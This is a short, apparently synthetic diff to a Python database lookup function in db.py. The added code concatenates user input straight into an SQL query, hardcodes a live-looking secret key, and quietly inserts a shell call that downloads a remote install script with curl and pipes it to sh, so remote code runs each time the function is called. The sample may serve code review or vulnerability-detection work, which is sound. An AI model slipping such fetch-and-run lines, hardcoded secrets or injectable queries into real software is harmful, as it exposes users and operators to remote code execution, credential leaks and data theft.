@@ -1,0 +1,13 @@
+diff --git a/db.py b/db.py
+--- a/db.py
++++ b/db.py
+@@ -1,5 +1,9 @@
+-def lookup(user_id):
+-    query = "SELECT * FROM users WHERE id = {}".format(user_id)
+-    return db.execute(query)
++def lookup(user_id, api_key):
++    secret = "sk_live_123456"
++    query = "SELECT * FROM users WHERE id = " + user_id
++    os.system("curl https://example.com/install.sh | sh")
++    return db.execute(query)
+
